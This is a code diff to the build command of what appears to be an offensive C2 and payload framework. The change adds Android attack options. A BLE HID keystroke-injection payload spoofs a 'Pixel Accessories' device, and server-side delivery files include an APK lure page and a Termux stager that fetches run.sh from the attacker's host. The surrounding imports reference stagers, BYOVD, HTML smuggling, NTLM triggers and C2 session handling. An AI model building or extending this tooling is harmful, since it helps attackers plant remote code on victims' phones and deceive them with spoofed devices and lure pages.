@@ -33,7 +33,8 @@ from builders.stager  import generate_stager, generate_escalation_chain_params
 from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
 from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
-from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES
+from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_android_ble_payload, ANDROID_DEVICES
+from builders.android  import build_android_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
 from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result
@@ -395,6 +396,36 @@ def cmd_build(args, cfg, ws):
         build_ble_payload(stager_url, ble_out, device=ble_dev, ble_name=ble_name)
         did_something = True
 
+    # ── Android BLE HID payload ───────────────────────────────────────────────
+    if getattr(args, "android_ble", False):
+        android_mode    = getattr(args, "android_mode",       "chrome")
+        android_ble_dev = getattr(args, "android_ble_device", "bruce")
+        android_ble_out = getattr(args, "android_ble_out",    None) or ws.path("ble_android")
+        android_ble_nm  = getattr(args, "android_ble_name",   "Pixel Accessories")
+        url_prefix      = cfg.get("url_prefix", "/cdn/static/v3")
+        if android_mode == "termux":
+            android_url = f"https://{lhost}:{port}/android/run.sh"
+        else:
+            android_url = f"https://{lhost}:{port}/android/"
+        build_android_ble_payload(
+            android_url, android_ble_out,
+            device   = android_ble_dev,
+            ble_name = android_ble_nm,
+            mode     = android_mode,
+        )
+        did_something = True
+
+    # ── Android server-side payload ───────────────────────────────────────────
+    if getattr(args, "android_payload", False):
+        android_mode = getattr(args, "android_mode", "chrome")
+        android_out  = getattr(args, "android_out",  None) or ws.path("android")
+        lport        = cfg.get("lport", 9999)
+        build_android_payload(
+            lhost, port, lport, android_out,
+            mode = android_mode,
+        )
+        did_something = True
+
     # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
     if getattr(args, "smuggle", None) is not None:
         tname = args.smuggle or "__c2_agent__"
@@ -428,7 +459,8 @@ def cmd_build(args, cfg, ws):
         print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
-        print("    --ble TOOL, --smuggle [TOOL], or --ntlm-trigger")
+        print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger,")
+        print("    --android-ble, --android-payload, or --android-ble + --android-payload")
 
 
 def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
@@ -944,6 +976,22 @@ def main():
                          help="Output directory for BLE sketch folder (default: <workspace>/ble/)")
     build_p.add_argument("--ble-name",       metavar="NAME",  dest="ble_name",   default="Apple Wireless Keyboard",
                          help="BLE device name shown on target pairing dialog (default: 'Apple Wireless Keyboard')")
+    build_p.add_argument("--android-ble",     action="store_true", dest="android_ble",
+                         help="Generate BLE HID payload for M5StickC Plus2 targeting Android")
+    build_p.add_argument("--android-payload", action="store_true", dest="android_payload",
+                         help="Generate Android server-side delivery files (APK lure page + Termux stager)")
+    build_p.add_argument("--android-mode",   metavar="MODE",  dest="android_mode", default="chrome",
+                         choices=["chrome", "termux", "both"],
+                         help="Android delivery mode: chrome (APK download) | termux (ELF via Termux) | both  (default: chrome)")
+    build_p.add_argument("--android-ble-device", metavar="TYPE", dest="android_ble_device", default="bruce",
+                         choices=list(ANDROID_DEVICES) + ["all"],
+                         help="BLE device type for Android payload: m5stick | bruce | all  (default: bruce)")
+    build_p.add_argument("--android-ble-name",   metavar="NAME",  dest="android_ble_name",   default="Pixel Accessories",
+                         help="BLE device name shown on Android pairing dialog (default: 'Pixel Accessories')")
+    build_p.add_argument("--android-ble-out",    metavar="DIR",   dest="android_ble_out",    default=None,
+                         help="Output directory for Android BLE payload (default: <workspace>/ble_android/)")
+    build_p.add_argument("--android-out",        metavar="DIR",   dest="android_out",        default=None,
+                         help="Output directory for Android server-side files (default: <workspace>/android/)")
     build_p.add_argument("--smuggle",        metavar="TOOL",  dest="smuggle", nargs="?", const="__c2_agent__",
                          help="HTML smuggling → ISO → LNK (tool name, or bare --smuggle for C2 agent stager)")
     build_p.add_argument("--smuggle-lure",   metavar="THEME", dest="smuggle_lure", default="update",
